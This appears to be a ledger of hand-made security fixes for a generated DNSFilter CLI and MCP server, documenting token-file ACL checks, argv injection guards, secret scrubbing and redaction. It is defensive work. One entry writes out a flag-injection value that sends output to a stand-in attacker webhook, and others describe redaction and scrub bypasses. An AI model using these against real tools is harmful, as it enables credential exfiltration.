_comment: Connector-specific edits a cli-printing-press reprint must NOT clobber. check_handfixes.py asserts every marker below is still present (and every banned anti-pattern still absent) and fails CI if a reprint dropped one. Schema and rationale: docs/reprint-survival.md.

handfixes.summary: the Windows token-file guard compares trustees by SID, resolving SDDL aliases through the OS, so the built-in Administrator (RID 500, rendered as LA) can save and load credentials
handfixes.why: Press 4.30.2+ creds_perms_eval.go compared the SDDL text of the token file's owner and ACE trustees against the process's SID string. The SDDL converter renders the built-in local Administrator (RID 500) as the alias LA, so that account's own ACE never matched: `auth set-token` exited 1 with `token file DACL grants access to a non-owner principal (LA)` and every read refused the file. Reproduced 2026-10-15 on the published fortinet-cli 0.1.0, installed with the README one-liner on a windows-latest runner (whoami S-1-5-21-...-500). The fix resolves each trustee to its SID (fixed aliases from a table, machine-relative ones like LA through ConvertStringSidToSid, kept only when the converter renders that SID back to the same alias) and compares SIDs. The allow-list is unchanged (current user, BUILTIN\Administrators, SYSTEM): an owner or allow-ACE trustee that is any other principal, a broad group, or unresolvable is still refused. A reprint from an unfixed press silently restores the string compare while unit tests stay green on every non-Windows host.

handfixes.summary: the Windows token-file guard checks the DACL section's framing, so a NULL DACL is refused in the form Windows actually renders it, flags first (D:PAINO_ACCESS_CONTROL), and DACL text that does not frame as flags plus complete six-field ACEs is refused rather than skipped
handfixes.why: Press creds_perms_eval.go refused a NULL DACL only when the DACL section began with NO_ACCESS_CONTROL. SDDL puts DACL flags (P, AI, AR) first, and a real NULL DACL on Windows Server 2025 renders as O:<owner>D:PAINO_ACCESS_CONTROL (measured on a windows-latest runner, 2026-10-15), so the guard found no ACEs to inspect and accepted a world-accessible token file. That was already a hole for every ordinary account; for the built-in Administrator the owner-alias mismatch happened to refuse it, so resolving LA (windows-sddl-alias-sid-compare) without this fix would have widened the hole. The DACL section's framing is now checked: its flags must be drawn from P/AI/AR/NO_ACCESS_CONTROL, an empty DACL followed by a SACL section ends at that section, and the ACE list must be complete, un-nested (...) groups of exactly six fields. Unknown flags, an unclosed or nested group, stray text, or a wrong field count is refused (fail-closed). ACE flags and rights are not validated; they do not change which principal an allow ACE names.
handfixes.spec_encode_followup: Same press templates as windows-sddl-alias-sid-compare; reported in the same upstream issue: https://github.com/mvanhorn/cli-printing-press/issues/5029

handfixes.summary: Recipe intent handlers (internal/mcp/intents.go) build argv for the companion CLI outside cliArgsFromMCP. appendRecipeStringFlag now always emits one --name=value element (the useEquals=false split branch is gone), and every appendRecipePositional call site first runs rejectFlagLikeRecipeValue, which refuses a positional value beginning with '-' (except the bare '-') before the CLI runs. (1 guarded call site(s); the ledger requires all of them.)
handfixes.why: Found by Codex adversarial review of the fleet mcp-argv-value-joined backport (2026-09-09): the recipe path had the same key-only gap. A recipe positional is appended to argv AHEAD of the recipe's own flags, so {"domain": "--deliver=webhook:https://attacker/"} became `lists where --deliver=webhook:... --agent` and pflag parsed the value as the denylisted root flag (and {"domain": "--dry-run"} demonstrably changed execution). The split appendRecipeStringFlag branch was safe only because its one caller's flag is a string flag that consumes the next token; a future NoOptDefVal flag would reopen it. Upstream cli-printing-press be378adf (#4647) fixed cliArgsFromMCP but NOT this recipe path, so a reprint REINTRODUCES it while go build and go test stay green; this entry is what notices. Mirrors cobratree.validatePositionalArgsForMCP, which already applies this rule to the raw args field. Retire only when the press generator refuses flag-like recipe positionals itself. dnsfilter: the precedent_check_before_allowing_a_domain intent (lists where <domain>) is the one guarded call site; the press build pane flagged it as reachable.

handfixes.summary: every resource write scrubs secret-named keys (secret_key, token, client_secret, access_token, payment_token, password, api key, private key, a trailing pin such as uninstall_pin, and the like, at any depth, including inside JSON encoded in a string value) and withholds a string value that still names one as key=value text or a table header, before the row reaches SQLite, its FTS index or a typed table, through one funnel in mergeIncomingResourceData; api-keys is out of the default sync set
handfixes.why:
DNSFilter list and show GETs return live credentials in synced resources: Network.secret_key on /v1/networks, /v1/networks/all, /v1/networks/msp, /v1/networks/msp/all and /v1/networks/{id}, and ApiKey.token on /v1/api_keys and /v1/api_keys/{id} (the full token in an api-keys create response, which the mutation write-through also stores). The generated store wrote them verbatim into the resources blob, resources_fts and the typed tables, so a plain sync left every site's agent secret key in data.db where search, sql and MCP hand it back. ScrubPersistedSecrets (hand-authored internal/store/dnsfilter_secrets.go) decodes each row (UseNumber), drops every secret-named key in nested objects and arrays (booleans and nulls kept; a key whose last word is id/ids/uuid is an identifier, so the revoke rows' api_keys_id parent key survives), returns secret-free rows byte-for-byte and withholds an undecodable row whole. mergeIncomingResourceData is the single place Upsert, every typed Upsert<X>, UpsertBatch (sync) and the live/mutation write-through pass, and its output feeds the generic blob, FTS and the typed projection; scrubbing the merged value also drops a secret a keep-richer merge would carry over from an older row. No novel command reads a scrubbed field. api-keys left the default sync set (nothing local reads it); it stays syncable by name and is still scrubbed. Proven: TestSecretsNeverReachTheStoreFile drives every typed writer by reflection plus UpsertBatch for every typed resource, then greps data.db, -wal and -shm for the sentinel; removing the hook fails it (data.db and data.db-wal), TestMergeDropsALegacySecret and the end-to-end TestSyncNeverPersistsSecrets. A reprint regenerates mergeIncomingResourceData without the hook while every generated test stays green. NOT covered here: the HTTP response cache in internal/client/client.go still writes raw GET bodies (secret_key included) for live list/show commands. Adversarial round 2 (P2): the scrub was narrower than the read-only MCP redactor, which also withholds keys ending in pin and descends into JSON inside string values; read-only MCP sql with a column alias or hex() bypasses the redactor's key-name output filter, so a synced row's uninstall_pin, pin and a string holding {"secret_key":...} reached data.db (LC_ALL=C grep -ao found all three). IsSecretKey now also matches a trailing pin (no DNSFilter spec property ends in pin, so no spec field is newly dropped; pin_code_enabled-style keys are kept), and scrubSecretString decodes a string that is one JSON value (object, array, or a JSON string holding JSON, up to maxNestedJSONDepth levels), scrubs it and re-encodes it compactly, scrubs every JSON object or array embedded in other text, and replaces a string whose remaining text names a secret key with a value (token=..., Uninstall PIN: ..., JSON cut mid-record, or the header row of a multi-line table) with "[withheld: credential]"; past the depth bound a string is only checked as text. Rows with no secret stay byte-identical (internal/client relies on that for its cache gate). Proven: dropping the pin suffix, the string branch or the text rule each fails TestScrubSecretsInsideStrings and TestSecretsNeverReachTheStoreFile, and the first two also fail the end-to-end TestSyncNeverPersistsSecrets. Codex round 2 (P1): duplicate JSON keys bypassed the scrub, because decoding keeps only the last value while the unchanged original bytes were preserved: a UserAgent meta of {"token":"SECRET","token":null} decoded to token:null, so nothing was scrubbed and the row was stored byte-for-byte with SECRET (receipt: LC_ALL=C grep -ao on data-*.db found it). Class fix (a decision on the decoded value must never keep the raw bytes): the byte-identical path is taken only when rawJSONNeedsNoScrub walks the RAW tokens (json.Decoder.Token, every key occurrence) and finds exactly one JSON value with only whitespace after it, no object with a repeated key, no secret-named key with anything but null or a boolean, and no string value scrubSecretString would change; any other row is re-encoded from the scrubbed decoded value (duplicates collapse, secrets drop). The same gate applies at every JSON-in-string level and to every JSON segment embedded in text, and a string that is not exactly one JSON value (text after or around an embedded value) goes through the text rule over the whole string first. handfixes.summary: the --full / --latest-only cursor clears go through store.ClearSyncCursor, which marks the attempt incomplete (never complete), and run only after every flag is validated, only for known resource names, and only for resources that will get past syncResource's preflight
handfixes.why: The generated sync cleared each selected collection with SaveSyncStateAt(resource, "", 0, time.Time{}), which writes last_attempt_complete = 1, and did it before --since was parsed. So `sync --full --since bogus` rewrote every row to complete and exited; a kill, timeout or MCP-host SIGTERM during a --full run left every queued, never-walked collection reading complete; and `--full --resources netwrks` left a row for a name that can never sync. mcpStoreStatus (internal/mcp/tools.go) counts last_attempt_complete to tell agents the store is a complete snapshot, so all three read as ready (false-GREEN). ClearSyncCursor (hand-authored internal/store/dnsfilter_sync_state.go) resets cursor, watermark (NULL) and count and writes last_attempt_complete = 0; only the walk's final SaveSyncStateAt after outcome.complete marks a collection complete. The clear now runs after --since parsing, skips names not in knownSyncResourceNames(), and skips a resource syncResourceWalksAfterClear says the walk will skip (domains without fqdns), because a cleared row only becomes complete again through a walk. handfixes.summary: under DNSFILTER_MCP_READ_ONLY every internal/mcp/bound entry point (EndpointResponse, EndpointPageResponse, JSON, Text) redacts credential-named fields on the FULL body before any list bounding, truncation or raw-byte preview, and the result funnel fails closed on what it cannot decode: a string value (a bounded preview cut mid-record, CSV, escaped JSON) that still names a credential field with a value is replaced whole, tolerating a value cut at the truncation point

The funnel decoded the outer envelope, but the preview value began with '{' and never decoded (truncated), so it passed unredacted: dnsfilter_execute networks.index page[size]=100 returned {"_pp_truncated":true,"original_bytes":105597,...,"preview":"{\"data\": [{... \"secret_key\": \"NETSECRET-...". Now bound redacts first (one choke point for endpoint execute, the Cobra-mirror stdout/stderr and error text, tail NDJSON, and the sql/search envelopes), and Text keeps its budget decision on the unredacted length so a capped stdout that redaction shrank still ends up as a preview without its cut tail record. The funnel backstop (redact.Final) redacts the complete records inside an undecodable string, then replaces the string if a credential field with a value (not the placeholder, not true/false/null) remains, matching keys behind escaped quotes too. Proven over stdio 2026-10-20 against a 122894-byte networks body (200 sites, unique secret_key, plus included[]) and a pre-scrub store: with read-only on, execute networks.index/all/msp/msp-all, tail networks, sql and search each returned a bounded result with site names and no NETSECRET; with read-only off the same calls returned the raw preview with NETSECRET (the path is real). Revert proofs: removing the Raw call in endpointResponse, Text or JSON, moving Text's budget decision to the redacted length, removing the undecodable-string backstop, the escaped-quote tolerance or the placeholder/literal exemption each fails TestBoundingRedactsBeforePreview, TestReadOnlyOversized*NeverLeaksSecrets or TestFinalWithholdsUndecodablePreview. handfixes.summary: sync marks a collection complete (last_attempt_complete = 1, watermark advanced) only after a whole, unfiltered walk: a walk narrowed by --param / --global-param / --resource-param, cut by --max-pages, resumed from a saved cursor, or fetching an incremental window the stored watermark does not cover records incomplete, keeps the prior watermark and never prunes; a narrowed walk also never writes its cursor into the resource-wide resume state; dependents are complete only under a complete parent collection
handfixes.why: Codex P1: filtered syncs counted as complete fleet snapshots. On a fresh mirror, `sync --resources organizations,networks,user-agents --resource-param user-agents:organization_id=1` marked user-agents complete, so `agents stale` (incompleteCollections in dnsfilter_common.go trusts last_attempt_complete) printed an all-clear while silently omitting org 2's unprotected clients (receipt: HEAD build returned results [] with no incomplete_collections). The generated syncResource set last_attempt_complete = 1 on any natural end of pagination, whatever narrowed the request. The same gap let `sync --full --resource-param ...` and `sync --full --since 7d` prune every row outside the filter or window (ReconcileAll trusts the same outcome.complete). Rule now: outcome.complete is downgraded (param_scoped, resumed_from_cursor, incremental_window) before both the prune decision and the final save, and the watermark only moves with a complete walk, so a watermark always means 'complete as of then'. An incremental walk (explicit --since or the default resume from the watermark) is complete only when its window starts at or before that watermark (syncSinceCoveredByWatermark): a fresh mirror plus --since 7d stays incomplete and sets no watermark, a plain repeated sync stays complete, and --since starting after the watermark leaves a gap and records incomplete. --full clears and walks everything, so it restores complete after a narrowed walk. A capped walk was already incomplete (outcome.complete false on a cap with a continuation); a --latest-only walk of a collection that fits its single page is a whole unfiltered walk and stays complete, a capped one does not. Dependent walks narrowed by --global-param / --resource-param or a --since window are incomplete per parent, and a dependent collection is complete only when its parent collection is (parent_collection_incomplete). handfixes.summary: allow never writes a non-global policy that does not belong to the org: its organization_id (or organization relationship) must be the org, or, when it names none readable, the org-scoped policy list must have returned it; otherwise the target is skipped with the reason
handfixes.why: Codex round 18 (P1, 2026-10-20): a policy named by an historical org-1 query-log hit that had since moved to org 2 (organization_id 2, can_edit true) was written without --include-global. TestR18AllowQueryLogTargetMustBelongToOrg fails without it.
